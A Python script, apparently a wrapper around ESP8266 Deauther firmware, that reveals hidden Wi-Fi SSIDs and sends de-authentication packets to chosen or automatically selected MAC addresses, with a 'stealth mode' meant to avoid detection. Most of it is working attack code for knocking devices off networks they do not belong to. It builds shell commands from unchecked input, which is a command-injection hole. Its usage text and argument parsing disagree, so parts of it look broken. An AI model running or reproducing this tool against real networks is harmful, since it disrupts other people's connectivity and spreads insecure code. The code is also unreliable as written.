import argparse
import os
import time

# -------------------------------------------
# ESP8266 - Hidden SSID Revealer & Wi-Fi Cloaking Detector
# -------------------------------------------
# Features:
# - Detects and reveals hidden Wi-Fi SSIDs
# - Identifies cloaked networks used for stealth operations
# - Logs all detected hidden networks for analysis
# - Supports continuous monitoring mode for real-time detection
# - Stealth mode to avoid detection while scanning
# - De-authentication attack to force SSID revelation
# - Auto-target selection for deauth attacks against hidden SSIDs
#
# Requirements:
# - ESP8266 / ESP-01S with Deauther firmware
# - Python 3.x
# - PySerial (for communication with ESP8266)
#
# Usage:
# 1. Scan for hidden Wi-Fi networks:
#    python esp8266_hidden_ssid_revealer.py --scan
# 2. Run continuous scanning to detect new hidden SSIDs:
#    python esp8266_hidden_ssid_revealer.py --scan --continuous
# 3. Enable stealth mode (randomized scanning intervals):
#    python esp8266_hidden_ssid_revealer.py --scan --stealth
# 4. Log detected hidden networks:
#    python esp8266_hidden_ssid_revealer.py --scan --log
# 5. Perform de-authentication attack to force SSID revelation:
#    python esp8266_hidden_ssid_revealer.py --deauth --target AA:BB:CC:DD:EE:FF
# 6. Auto-select targets and execute forced SSID revelation:
#    python esp8266_hidden_ssid_revealer.py --deauth-auto
# -------------------------------------------

def scan_hidden_ssid(continuous=False, stealth=False, log=False):
    """Scans for hidden Wi-Fi networks and reveals their SSIDs."""
    print("[+] Scanning for hidden Wi-Fi SSIDs...")
    command = "python deauther.py scan-hidden"
    if continuous:
        command += " --continuous"
    if stealth:
        command += " --stealth"
    if log:
        command += " > hidden_ssid_results.txt"
    os.system(command)
    print("[✔] Scan completed. Results saved.")

def deauth_hidden_ssid(target):
    """Performs a de-authentication attack on a target to reveal hidden SSIDs."""
    print(f"[+] Sending deauth packets to {target}...")
    os.system(f"python deauther.py deauth --target {target}")
    print("[✔] Deauth attack completed.")

def auto_deauth():
    """Automatically selects hidden SSID targets and launches deauth attacks."""
    print("[+] Scanning for hidden SSIDs and selecting targets...")
    os.system("python deauther.py scan-hidden > hidden_ssid_targets.txt")
    with open("hidden_ssid_targets.txt", "r") as f:
        targets = f.readlines()
    if targets:
        for target in targets:
            target_mac = target.strip()
            print(f"[+] Launching deauth attack on {target_mac}...")
            deauth_hidden_ssid(target_mac)
    else:
        print("[!] No hidden SSIDs detected.")

def main():
    parser = argparse.ArgumentParser(description="ESP8266 - Hidden SSID Revealer & Wi-Fi Cloaking Detector")
    parser.add_argument("--scan", action='store_true', help="Scan for hidden Wi-Fi networks")
    parser.add_argument("--continuous", action='store_true', help="Run continuous scanning mode")
    parser.add_argument("--stealth", action='store_true', help="Enable stealth mode with randomized intervals")
    parser.add_argument("--log", action='store_true', help="Log detected hidden networks")
    parser.add_argument("--deauth", type=str, help="Perform de-authentication attack on a target MAC address")
    parser.add_argument("--deauth-auto", action='store_true', help="Auto-select and attack hidden SSID targets")
    args = parser.parse_args()

    if args.scan:
        scan_hidden_ssid(args.continuous, args.stealth, args.log)
    elif args.deauth:
        deauth_hidden_ssid(args.deauth)
    elif args.deauth_auto:
        auto_deauth()
    else:
        print("[!] No valid command provided. Use --help for options.")

if __name__ == "__main__":
    main()
